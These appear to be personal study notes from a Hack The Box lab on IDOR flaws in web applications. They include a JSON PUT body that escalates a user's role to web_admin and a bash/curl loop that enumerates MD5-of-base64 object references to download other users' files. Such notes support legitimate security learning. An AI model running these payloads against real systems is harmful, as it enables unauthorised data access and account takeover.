
## IDOR Root Cause
IDOR vulnerabilities occur when a web application exposes a direct reference to an object, like a file or a database resource, which the end-user can directly control to obtain access to other similar objects.
```
, if users request access to a file they recently uploaded, they may get a link to it such as (`download.php?file_id=123`). So, as the link directly references the file with (`file_id=123`), what would happen if we tried to access another file (which may not belong to us) with (`download.php?file_id=124`)?
```

##### an IDOR vulnerability mainly exists due to the lack of an access control on the back-end

## idor in insecure APIs (this part is heaviy on screenshots and scenairos)
https://academy.hackthebox.com/module/134/section/1201

detect role/uuid values by trying get requests (idor information disclosure)
locate users with admin roles
attempt idor post calls 
ensue ids/uids/ api query params match etc when trying to access other users 

Now, with the user's `uuid` at hand, we can change this user's details by sending a `PUT` request to `/profile/api.php/profile/2` with the above details along with any modifications we made, as follows:
`JSON IN API REQUEST`
```json
{ 
    "uid": "X",
    "uuid": "a36fa9e66e85f2dd6f5e13cad45248ae",
    "role": "web_admin",
    "full_name": "administrator",
    "email": "webadmin@employees.htb",
    "about": "HTB{FLAG}"
}
``````
We may modify the admin's details and then perform one of the above attacks to take over their account. However, as we now know the admin role name (`web_admin`), we can set it to our user so we can create new users or delete current users. To do so, we will intercept the request when we click on the `Update profile` button and change our role to `web_admin`:

`
### Encoded References
In some cases, web applications make hashes or encode their object references, making enumeration more difficult, but it may still be possible.

![[Pasted image 20250812233942.png]]
### bypassing encoded references
```php
contract=cdd96d3cc73d1dbdaffa03cc6cd7339b
```
lets say devs did the obfuscation in frontend and u were able to obtain this function
```javascript
function downloadContract(uid) {
    $.redirect("/download.php", {
        contract: CryptoJS.MD5(btoa(uid)).toString(),
    }, "POST", "_self");
}
```

script it
```bash
#!/bin/bash

for i in {1..10}; do
    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
        curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
    done
done
```

